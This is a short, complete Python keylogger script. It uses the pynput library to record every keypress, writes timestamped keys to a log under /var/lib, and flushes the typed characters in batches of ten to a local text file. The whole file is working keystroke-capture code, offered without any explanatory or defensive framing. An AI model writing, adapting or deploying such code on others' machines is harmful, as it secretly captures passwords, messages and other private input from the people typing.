#!/usr/bin/python
import pynput
import logging
import os


from pynput.keyboard import Key, Listener


localLog = os.path.abspath("log/keyloggerLocal_log.txt")
globalLog = os.path.abspath("/var/lib/keyloggerGlobal_log.txt")


count = 0
keys = []


logging.basicConfig(filename=(globalLog),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    # print("{0} pressed".format(key))

    logging.info(str(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(localLog, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


with Listener(on_press=on_press) as listener:
    listener.join()
